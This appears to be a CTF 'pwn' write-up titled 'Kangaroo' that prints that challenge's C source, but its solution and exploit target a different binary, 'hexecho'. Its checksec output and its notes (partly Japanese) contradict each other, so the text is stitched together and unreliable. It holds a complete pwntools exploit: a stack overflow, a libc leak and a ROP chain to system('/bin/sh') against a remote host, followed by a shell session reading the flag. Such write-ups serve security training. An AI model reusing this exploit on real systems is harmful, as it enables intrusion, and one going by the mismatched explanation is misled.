# Kangaroo : Pwn

The word kangaroo derives from the Guugu Yimithirr word gangurru, referring to eastern grey kangaroos.

Attachment  
[kangaroo.tar.gz](kangaroo.tar.gz)  

Tags : Integer Overflow, Out-Of-Bounds Read, Out-Of-Bounds Write, Grobal Buffer Overflow, Libc Leak, Function Pointer  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SLOT 8
#define SIZE 0x48

char g_messages[SLOT*SIZE];
void (*fn_clear)(void*, size_t);

static void clear_message(void *buf, size_t len) {
  memset(buf, 0, len);
}

off_t get_offset(const char *s) {
  off_t offset;
  ssize_t index;

  printf("%s", s);
  if (scanf("%ld", &index) != 1)
    exit(1);

  if (index >= LLONG_MAX / SIZE) {
    puts("[-] Integer overflow");
    exit(1);
  }

  offset = index * SIZE;
  if (offset < 0 || offset >= sizeof(g_messages)) {
    puts("[-] Invalid offset");
    exit(1);
  }

  return offset;
}

void read_line(const char *s, char *buf, size_t n) {
  printf("%s", s);
  for (size_t i = 0; i < n; i++) {
    if (read(0, buf + i, 1) != 1) exit(1);
    if (buf[i] == '\n') {
      buf[i] = '\0';
      break;
    }
  }
}

int main() {
  off_t offset;
  int choice;

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  fn_clear = clear_message;

  puts("1. Read\n2. Write\n3. Clear");
  while (1) {
    printf("> ");
    if (scanf("%d", &choice) != 1)
      break;

    switch (choice) {
      case 1: // Read
        offset = get_offset("Index: ");
        read_line("Message: ", g_messages + offset, SIZE);
        break;

      case 2: // Write
        offset = get_offset("Index: ");
        printf("Message: %s\n", g_messages + offset);
        break;

      case 3: // Clear
        fn_clear(g_messages, sizeof(g_messages));
        break;

      default:
        return 0;
    }
    
  }
  return 0;
}
```
This program unecheck the size, so there are BOF vulnerability.
```
$ checksec kangaroo
[*] '/home/colza/kangaroo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
It is difficult to leak the canary.  
If `scanf` is given some uninterpretable characters, `scanf` do not write characters to buffer. And then, that characters remain in the stream, causing all subsequent calls to `scanf` to fail.  
If enter `+` or `-`, it will be interpreted as a hexadecimal value and cause `scanf` to fail.

The apploach is as follows:
* Evade to overwrite the canary using `+`.
* Libc leak and overwrite the return address to `hexecho`.
* `system('/bin/sh')` with ROP chain.
* globalからlibc leak
* globalから  fn_clearをsystem('/bin/sh')に上書き
* clearで発火

The return addres is located at rbp+0x8. So, offset from input to return address is 0x118.
```
  401292:       48 8d 85 f0 fe ff ff    lea    rax,[rbp-0x110]
  401299:       89 d6                   mov    esi,edx
  40129b:       48 89 c7                mov    rdi,rax
  40129e:       e8 46 ff ff ff          call   4011e9 <get_hex>
```
As `_IO_2_1_stdout_` is at `0x110-0x78=0x98` among the data that can be leaked, we will use this to calculate the libc base.
```
03:0018│ rax rdi 0x7fffffffdad0 ◂— 0
04:0020│-108     0x7fffffffdad8 ◂— 0
05:0028│-100     0x7fffffffdae0 ◂— 0x40 /* '@' */
06:0030│-0f8     0x7fffffffdae8 ◂— 4
07:0038│-0f0     0x7fffffffdaf0 ◂— 0x40 /* '@' */
08:0040│-0e8     0x7fffffffdaf8 ◂— 0x10
09:0048│-0e0     0x7fffffffdb00 ◂— 0
0a:0050│-0d8     0x7fffffffdb08 ◂— 0x100000000
0b:0058│-0d0     0x7fffffffdb10 ◂— 0
0c:0060│-0c8     0x7fffffffdb18 ◂— 0x8e00000006
0d:0068│-0c0     0x7fffffffdb20 ◂— 0x80000000a /* '\n' */
0e:0070│-0b8     0x7fffffffdb28 ◂— 0
... ↓            2 skipped
11:0088│-0a0     0x7fffffffdb40 ◂— 2
12:0090│-098     0x7fffffffdb48 ◂— 0x8000000000000006
13:0098│-090     0x7fffffffdb50 ◂— 0
... ↓            2 skipped
16:00b0│-078     0x7fffffffdb68 —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2887
```

The steps are as follows:
 * set the input size 0x128
 * send the payload consist of 0x118-padding, ret and main address
 * leak address and calculate the libc base address
 * set the input size 0x138
 * send the payload consist of 0x118-padding and `system("/bin/sh")` ROP chain
 * get the flag

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./hexecho")
libc = ELF("./libc.so.6")

context.arch = 'amd64'

p = remote("34.170.146.252", 42121)

p.sendlineafter(b"Size: ", b"296")

main_addr = elf.symbols['main']

ret_main = p64(next(elf.search(asm("ret"), executable=True)))
ret_main += p64(main_addr)

payload = b"+ "*0x118
payload += b" ".join([f"{c:02x}".encode() for c in ret_main])

p.sendlineafter(b"Data (hex): ", payload)

p.recvuntil(b"Received: ")
leak = bytes([int(c, 16) for c in p.recvline().split()])
libc.address = u64(leak[0x98:0xa0]) - libc.symbols['_IO_2_1_stdout_']
log.info(hex(libc.address))

rop = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(next(libc.search(asm("ret"), executable=True)))
rop += p64(libc.symbols["system"])

rop_payload = b"+ "*0x118
rop_payload += b" ".join([f"{c:02x}".encode() for c in rop])

p.sendlineafter(b"Size: ", b"312")
p.sendlineafter(b"Data (hex): ", rop_payload)

p.recvline()
p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/hexecho'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/colza/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 34.170.146.252 on port 42121: Done
[*] 0x7f24d72de000
[*] Switching to interactive mode
$ ls
run
$ cd ../
$ ls
app
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 42121
[*] Got EOF while sending in interactive
```

Got the flag!

`Alpaca{4Lw4y5_cH3cK_1f_a_fuNc71on_f4iL3d}`

# References
`g_messages[SLOT*SIZE]`は最大0x240offset
offsetは`index*SIZE=0x240`
sizeの8を掛けて0x238になるindex値は`-1024819115206086193`
```
 ► 0x4013ea <main+245>    call   rax                         <clear_message>
        rdi: 0x404080 (g_messages) ◂— 0
        rsi: 0x240
        rdx: 0
        rcx: 0

   0x4013ec <main+247>    jmp    main+256                    <main+256>
    ↓
   0x4013f5 <main+256>    jmp    main+69                     <main+69>
    ↓
   0x40133a <main+69>     mov    edi, 0x40204d     EDI => 0x40204d ◂— 0x6e4900642500203e /* '> ' */
   0x40133f <main+74>     mov    eax, 0            EAX => 0
   0x401344 <main+79>     call   printf@plt                  <printf@plt>

   0x401349 <main+84>     lea    rax, [rbp - 0xc]
   0x40134d <main+88>     mov    rsi, rax
   0x401350 <main+91>     mov    edi, 0x402050        EDI => 0x402050 ◂— 0x7865646e49006425 /* '%d' */
   0x401355 <main+96>     mov    eax, 0               EAX => 0
   0x40135a <main+101>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdbd0 ◂— 0x3ffffdcc0
01:0008│-008 0x7fffffffdbd8 —▸ 0x7fffffffdd08 —▸ 0x7fffffffdfc0 ◂— '/mnt/c/Users/NAEL/Desktop/kangaroo'
02:0010│ rbp 0x7fffffffdbe0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdce0 ◂— 0
03:0018│+008 0x7fffffffdbe8 —▸ 0x7ffff7dd31ca ◂— mov edi, eax
```
printfのindex9でlibcのアドレスリークができる。

000000000002a140 T __libc_init_first@@GLIBC_2.2.5
__libc_init_first+138
